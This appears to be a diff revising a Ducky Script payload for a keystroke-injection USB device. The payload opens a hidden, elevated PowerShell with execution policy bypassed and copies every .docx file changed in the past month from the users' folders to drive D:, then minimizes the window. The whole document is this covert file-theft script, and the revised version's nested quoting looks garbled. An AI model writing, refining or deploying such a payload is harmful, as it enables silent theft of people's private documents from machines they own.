@@ -1,10 +1,10 @@
 REM Ducky Script
 DELAY 2000
-GUI r
-DELAY 200
-STRING powershell Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -Command "$sourceFolder = \"C:\Users\"; $destinationFolder = \"D:\"; $startDate = (Get-Date).AddMonths(-1); $endDate = Get-Date; Get-ChildItem -Path $sourceFolder -Recurse -Filter *.docx | Where-Object { $_.LastWriteTime -ge $startDate -and $_.LastWriteTime -le $endDate } | Copy-Item -Destination $destinationFolder -Container -Force"' -Verb RunAs
+GUI
+DELAY 500
+STRING powershell Start-Process powershell -ArgumentList '-WindowStyle Hidden -ExecutionPolicy Bypass -NoExit -Command "Start-Process powershell -ArgumentList \"-ExecutionPolicy Bypass -Command `$sourceFolder = `"C:\Users\""; `$destinationFolder = `"D:\\""; `$startDate = (Get-Date).AddMonths(-1); `$endDate = Get-Date; Get-ChildItem -Path `$sourceFolder -Recurse -Filter *.docx | Where-Object { `$_.LastWriteTime -ge `$startDate -and `$_.LastWriteTime -le `$endDate } | Copy-Item -Destination `$destinationFolder -Container -Force\"" -Verb RunAs'
 ENTER
-DELAY 3000
+DELAY 500
 REM Minimize PowerShell window
 ALT SPACE
 STRING n
